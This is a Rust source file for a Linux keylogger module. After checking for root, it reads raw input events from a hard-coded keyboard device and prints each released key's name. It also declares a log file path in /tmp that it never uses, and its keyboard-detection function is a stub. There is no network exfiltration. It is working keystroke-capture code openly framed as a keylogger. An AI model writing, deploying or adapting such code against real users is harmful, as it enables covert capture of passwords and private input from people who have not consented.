use std::{
    fs::File,
    io::Read,
    str, 
    mem,
};

use libc::input_event;

use crate::common::Common;
use super::input::{
    KEY_NAMES,
    SHIFT_KEY_NAMES,
    MAX_KEYS,
    UK,
};

const EVENT_PATH: &str = "/dev/input/event5";
const DATA_PATH: &str = "/tmp/data.log";

const EV_SIZE: usize = mem::size_of::<input_event>();
const EV_KEY: u16 = 1;

pub struct Keylogger { }

impl Common for Keylogger {
    fn find_keyboard(&self) -> bool {
        true
    }

    fn start_logging(&self) {
        check_root();

        let mut device_file = File::open(EVENT_PATH).unwrap_or_else(|e| panic!("Could not open device file: {}", e) );
        let mut buf: [u8; EV_SIZE] = unsafe { mem::zeroed() };  

        loop {
            match device_file.read(&mut buf) {
                Ok(num) => {
                    if num != EV_SIZE {
                        panic!("Error while reading!");
                    }

                    let ev = unsafe { mem::transmute::<[u8; EV_SIZE], input_event>(buf) };
                    self.log_keystroke(ev);
                },
                Err(e) => panic!("Could not read: {}", e)
            }
        }
    }

    fn log_keystroke(&self, ev: input_event) {
        if ev.type_ == EV_KEY && ev.value == 0 {
            let key = KEY_NAMES[ev.code as usize];

            println!("{}", key);
        }
    }
}

fn check_root() {
    let euid = unsafe { libc::geteuid() };
    if euid != 0 {
        panic!("Must run as root user");
    }
}
